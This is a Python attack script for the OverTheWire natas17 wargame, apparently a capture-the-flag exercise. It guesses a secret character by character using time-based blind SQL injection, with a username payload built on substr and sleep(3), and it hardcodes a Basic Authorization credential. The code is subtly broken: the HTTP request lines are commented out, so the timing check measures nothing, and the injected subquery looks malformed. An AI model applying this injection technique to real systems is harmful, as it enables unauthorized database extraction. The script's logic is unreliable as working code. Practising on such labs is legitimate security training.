# http://docs.python-requests.org/en/master/user/quickstart/#make-a-request
import string
import requests
import time
import binascii
# from urllib import unquote

alphabet = "_{}" + string.digits + string.ascii_letters
found = ""
flag_length = 64

url = "http://natas17.natas.labs.overthewire.org"
p = {} # parameters
c = {} # cookies
h = {} # headers
d = {} # post data
j = {} # json data
pr = {"http" : "http://127.0.0.1:8080", "https" : "https://127.0.0.1:8080"}
# r = requests.get(url, params=p, headers=h, cookies=c, proxies=pr, timeout=5, verify=False)
# r = requests.post(url, data=d, headers=h, cookies=c, proxies=pr, timeout=5, verify=False)
# print(r.url)
# print(r.status_code)
# print(r.headers)
# print(r.cookies)
# print(r.text)

"""
s = requests.Session()

s.get('https://httpbin.org/cookies/set/sessioncookie/123456789')
r = s.get('https://httpbin.org/cookies')

print(r.text)
"""



place = len(found) + 1
hit = True
while place < flag_length and hit:
	hit = False
	for guess in alphabet:
		print(guess)
		# p = {"username" : "a\" or SUBSTR(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=\"BASE+TABLE\" LIMIT 1," + str(place) + ",1)=\"" + guess }
		p = {"username" : "a\" or substr(select \"a\" from information_schema.tables," + str(place) + ",1)=\"" + guess + "\" and sleep(3) and \"1\"=\"1"}
		c = {}
		h = {"Authorization" : "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="}
		# d = {}
		
		start = time.time()
		# r = requests.get(url, params=p, headers=h, cookies=c)
		# r = requests.post(url, data=d, headers=h, cookies=c)
		stop = time.time()
		condition = (stop-start) > 2
		# condition = "" in r.text
		if condition:
			place += 1
			found += guess
			print(found)
			hit = True 
			break
		
		# print(r.url)
		# print(r.status_code)
		# received = r.text
		# print(received)
	
print("Result = " + found)